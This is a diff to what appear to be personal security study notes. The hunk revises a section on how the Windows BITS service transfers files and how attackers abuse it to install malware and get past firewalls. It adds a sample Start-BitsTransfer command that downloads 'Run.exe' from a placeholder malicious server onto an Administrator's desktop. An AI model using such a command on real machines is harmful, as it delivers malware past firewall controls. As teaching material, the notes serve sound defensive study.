@@ -17,10 +17,15 @@ LINE
 
 BITS
 -----
-Background Intelligent Transfer Service (BITS) is a Windows tool used to transfer data between a client and server. Primarily utilised for downloading Windows updates,
-this service has also been employed by malicious users to install malware.
+-Background Intelligent Transfer Service (BITS) is a Windows tool used to transfer data between a client and server. Primarily utilised for downloading Windows updates,
+	this service has also been employed by malicious users to install malware.
+-BITS makes use of idle network bandwidth to transfer files at an increased rate. However, if other applications start using more bandwidth, the transfer rate is decreased.
+- BITS is primarily used for Windows updates, it is available across a wide range of Windows machines and able to bypass firewall restrictions.
+-PowerShell
+Windows includes command line tools to support users transferring files with BITS. While BITSAdmin is now deprecated, BITS PowerShell cmdlets can be used to perform many of
+	the same tasks. 
 
-
+	"Start-BitsTransfer -Source http://MyNastyServer.net/m4lw4r3/Run.exe -Destination C:\users\Administrator\Desktop\Run.exe"
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Volume Shadow Copies 		VSS
